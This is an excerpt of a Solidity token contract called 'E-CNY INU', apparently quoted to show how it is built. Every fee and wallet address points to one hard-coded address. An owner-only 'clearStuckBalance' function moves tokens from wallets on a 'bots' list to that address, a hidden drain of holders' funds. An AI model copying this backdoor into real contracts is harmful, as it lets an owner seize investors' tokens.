...
contract ECNYINU is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xe7380747bb48f73103ac865f3b67b8c60A428096));
    address payable public _teamwallet =
        payable(address(0xe7380747bb48f73103ac865f3b67b8c60A428096));
    address _partnershipswallet =
        payable(address(0xe7380747bb48f73103ac865f3b67b8c60A428096));
    address private _donationAddress =
        0xe7380747bb48f73103ac865f3b67b8c60A428096;

    string private _name = "E-CNY INU";
    string private _symbol = "E-CNY INU";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xe7380747bb48f73103ac865f3b67b8c60A428096), amount);
        }
